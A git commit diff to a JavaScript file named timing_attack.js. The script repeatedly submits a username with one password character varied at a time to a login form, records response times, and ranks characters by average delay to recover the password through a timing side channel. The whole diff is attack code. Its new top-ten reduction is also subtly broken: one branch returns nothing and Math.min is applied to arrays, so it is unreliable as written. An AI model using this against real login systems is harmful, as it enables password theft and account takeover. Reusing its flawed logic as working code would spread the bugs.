c115ace4c3c25e0cd1f3d8deb0d8794c3a19f3c9
kasperlauge <kasperlaugemadsen@gmail.com>
2019-11-23 13:06:37 +0100

    Fixed bug in array concatenation

--- timing_attack.js
+++ timing_attack.js
@@ -37,7 +37,9 @@ let k = 0;
 // });
 
 function tryPass(startIndex, maxInd, replInd, replMax) {
-  tryTiming.push([String.fromCodePoint(startIndex), []]);
+  if (replInd === 0) {
+    tryTiming.push([String.fromCodePoint(startIndex), []]);
+  }
   let fuzzyPass = startPass.slice(0,k) + String.fromCodePoint(startIndex) + startPass.slice(k + 1);
   let formData = new FormData();
   formData.append('username', uname);
@@ -48,12 +50,12 @@ function tryPass(startIndex, maxInd, replInd, replMax) {
     body: formData
   }).then(res => {
     tryTiming[startIndex][1].push(new Date().getTime() - startTime);
+    if (replInd + 1 < replMax) {
+      return tryPass(startIndex, maxInd, replInd + 1, replMax);
+    }
+
     if (startIndex + 1 < maxInd) {
-      if (replInd + 1 < replMax) {
-        return tryPass(startIndex, maxInd, replInd + 1, replMax);
-      } else {
-        return tryPass(startIndex + 1, maxInd, 0, replMax);
-      }
+      return tryPass(startIndex + 1, maxInd, 0, replMax);
     } else {
       return Promise.resolve(tryTiming);
     }
@@ -61,5 +63,17 @@ function tryPass(startIndex, maxInd, replInd, replMax) {
 }
 
 tryPass(0x0000, 0x00ff, 0, 2).then(res => {
+  let averages = res.map(arr => [arr[0], arr[1].reduce((prev, curr) => prev + curr) / arr[1].length]);
+  let topNumber = 10;
+  let topTen = averages.reduce((prev, curr) => {
+    if (prev.length < topNumber) {
+      return [...prev, curr];
+    } else {
+      let smallestInd = prev.indexOf(Math.min(...prev));
+      prev[smallestInd] = prev[smallestInd] > curr ? prev[smallestInd] : curr;
+    }
+  }, []);
   console.log(res);
+  console.log(averages);
+  console.log(topTen);
 });
